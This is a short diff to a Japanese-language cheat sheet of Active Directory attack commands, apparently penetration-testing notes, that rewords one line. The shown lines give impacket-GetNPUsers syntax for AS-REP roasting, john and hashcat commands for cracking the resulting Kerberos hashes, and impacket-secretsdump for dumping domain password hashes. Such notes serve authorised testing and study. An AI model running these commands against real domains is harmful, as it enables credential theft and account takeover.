@@ -29,8 +29,8 @@
     - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名 -outputfile 出力ファイル名」  
       で`ASREPRoast`（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
       取得したTGTを「john --wordlist=Wordlist名 TGT名」または「hashcat -a 0 -m 18200 wordlist名 TGT名 」でクラックできる  
-    - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名」　　
-      では「-userfile」内の各ユーザがASREPRoastできるかどうか確認できる
+    - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名」  
+      では「-userfile」内の各ユーザがASREPRoastできるかどうかBruteForceで確認
   - secretsdump  
     「`impacket-secretsdump` -just-dc ドメイン名/ユーザ名:パスワード@IPアドレス」  
     でドメインユーザのパスワードハッシュをダンプできる。
